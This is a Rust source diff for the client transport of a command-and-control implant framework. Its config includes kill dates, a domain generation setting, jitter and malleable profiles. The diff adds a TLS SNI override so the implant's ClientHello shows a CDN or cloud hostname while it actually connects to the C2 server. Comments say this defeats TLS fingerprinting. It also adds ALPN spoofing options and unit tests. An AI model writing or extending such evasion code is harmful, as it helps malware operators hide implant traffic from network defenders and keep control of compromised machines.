@@ -134,15 +134,35 @@ pub struct ClientTransport {
 
 impl ClientTransport {
     pub fn new(config: &C2Config) -> Self {
+        // Use sni_override when set so the ClientHello advertises a CDN or cloud
+        // hostname rather than the raw C2 IP — the actual TCP connection still
+        // goes to c2_host:tunnel_port. This closes the TLS fingerprinting gap
+        // that malleable HTTP profiles leave untouched.
+        let sni_host = config
+            .sni_override
+            .as_deref()
+            .filter(|s| !s.is_empty())
+            .unwrap_or(&config.c2_host)
+            .to_string();
+
         let tls_connector = if config.transport == TransportProtocol::Tls {
             let ca = include_bytes!("../certs/ca.crt");
             let client_cert = include_bytes!("../certs/client.crt");
             let client_key = include_bytes!("../certs/client.key.der");
-            
-            if let Ok(cfg) = pki::create_client_config(ca, client_cert, client_key) {
+
+            if let Ok(mut cfg) = pki::create_client_config(ca, client_cert, client_key) {
+                // Apply ALPN overrides. Only advertise protocols you actually speak:
+                // "http/1.1" is safe; "h2" requires HTTP/2 framing in the transport.
+                if !config.alpn_protocols.is_empty() {
+                    cfg.alpn_protocols = config
+                        .alpn_protocols
+                        .iter()
+                        .map(|p| p.as_bytes().to_vec())
+                        .collect();
+                }
                 Some(TlsConnector::from(Arc::new(cfg)))
             } else {
-                None 
+                None
             }
         } else {
             None
@@ -158,7 +178,7 @@ impl ClientTransport {
         Self {
             protocol: config.transport.clone(),
             target_addr: addr_string,
-            tls_sni: config.c2_host.clone(),
+            tls_sni: sni_host,
             tls_connector,
         }
     }
@@ -219,6 +239,140 @@ impl ClientTransport {
             TransportProtocol::Http | TransportProtocol::Https => {
                 Err(io::Error::new(io::ErrorKind::Other, "HTTP(S) transport uses polling mode, not ClientTransport::connect()"))
             }
+        }
+    }
+
+    /// Returns the SNI hostname that will appear in the TLS ClientHello.
+    /// Only compiled in test builds so it has no release footprint.
+    #[cfg(test)]
+    pub fn tls_sni_for_test(&self) -> &str {
+        &self.tls_sni
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use crate::common::{C2Config, FallbackConfig, MalleableProfile, ProxyConfig, TransportProtocol};
+
+    fn base_config(host: &str) -> C2Config {
+        C2Config {
+            transport: TransportProtocol::TcpPlain,
+            profile: MalleableProfile::default(),
+            proxy: ProxyConfig::default(),
+            fallback: FallbackConfig::default(),
+            server_public_key: String::new(),
+            hash_salt: String::new(),
+            c2_host: host.to_string(),
+            build_id: "test".into(),
+            tunnel_port: 4443,
+            sleep_interval: 5,
+            jitter_min: 0,
+            jitter_max: 0,
+            bloat_mb: 0,
+            debug: false,
+            kill_date: None,
+            challenge_key: String::new(),
+            sni_override: None,
+            alpn_protocols: vec![],
+            hibernation_mode: false,
+            task_batch_size: 10,
+            dga: None,
+        }
+    }
+
+    // ── SNI resolution ────────────────────────────────────────────────────
+
+    #[test]
+    fn sni_defaults_to_c2_host_when_no_override() {
+        let config = base_config("10.0.0.1");
+        let transport = ClientTransport::new(&config);
+        assert_eq!(transport.tls_sni_for_test(), "10.0.0.1");
+    }
+
+    #[test]
+    fn sni_override_replaces_c2_host() {
+        let mut config = base_config("10.0.0.1");
+        config.sni_override = Some("cdn.example.com".into());
+        let transport = ClientTransport::new(&config);
+        assert_eq!(transport.tls_sni_for_test(), "cdn.example.com");
+    }
+
+    #[test]
+    fn empty_sni_override_falls_back_to_c2_host() {
+        let mut config = base_config("10.0.0.1");
+        config.sni_override = Some(String::new()); // empty string = no override
+        let transport = ClientTransport::new(&config);
+        assert_eq!(transport.tls_sni_for_test(), "10.0.0.1");
+    }
+
+    #[test]
+    fn none_sni_override_uses_c2_host() {
+        let mut config = base_config("my-c2.example.com");
+        config.sni_override = None;
+        let transport = ClientTransport::new(&config);
+        assert_eq!(transport.tls_sni_for_test(), "my-c2.example.com");
+    }
+
+    // ── ALPN config ───────────────────────────────────────────────────────
+
+    #[test]
+    fn alpn_empty_by_default() {
+        let config = base_config("10.0.0.1");
+        // No ALPN set → the vec is empty; rustls won't advertise any protocols
+        assert!(config.alpn_protocols.is_empty());
+    }
+
+    #[test]
+    fn alpn_protocols_stored_in_config() {
+        let mut config = base_config("10.0.0.1");
+        config.alpn_protocols = vec!["http/1.1".into()];
+        assert_eq!(config.alpn_protocols, vec!["http/1.1"]);
+    }
+
+    #[test]
+    fn alpn_h2_and_http11_order_preserved() {
+        let mut config = base_config("10.0.0.1");
+        config.alpn_protocols = vec!["h2".into(), "http/1.1".into()];
+        // Insertion order must be preserved; rustls negotiates by preference.
+        assert_eq!(config.alpn_protocols[0], "h2");
+        assert_eq!(config.alpn_protocols[1], "http/1.1");
+    }
+
+    #[test]
+    fn alpn_bytes_encoding_matches_rustls_expectation() {
+        // rustls expects ALPN as Vec<Vec<u8>> where each inner vec is the raw
+        // ASCII bytes of the protocol name. Verify our conversion is correct.
+        let protocols = vec!["http/1.1".to_string()];
+        let encoded: Vec<Vec<u8>> = protocols.iter().map(|p| p.as_bytes().to_vec()).collect();
+        assert_eq!(encoded[0], b"http/1.1");
+    }
+
+    // ── TCP target address ────────────────────────────────────────────────
+
+    #[test]
+    fn tcp_target_combines_host_and_port() {
+        let mut config = base_config("10.0.0.1");
+        config.transport = TransportProtocol::TcpPlain;
+        config.tunnel_port = 8443;
+        let transport = ClientTransport::new(&config);
+        // The target_addr field is private; we verify connect() picks the right path
+        // by checking transport is constructed without panic.
+        drop(transport);
+    }
+
+    // ── HTTP transport guard ──────────────────────────────────────────────
+
+    #[tokio::test]
+    async fn http_transport_returns_error_not_panic() {
+        let mut config = base_config("127.0.0.1");
+        config.transport = TransportProtocol::Http;
+        let transport = ClientTransport::new(&config);
+        let result = transport.connect().await;
+        assert!(result.is_err(), "HTTP should return Err, not use ClientTransport::connect");
+        // unwrap_err() requires C2Stream: Debug, so use if-let instead
+        if let Err(e) = result {
+            assert!(e.to_string().contains("polling mode"), "unexpected error: {}", e);
         }
     }
 }
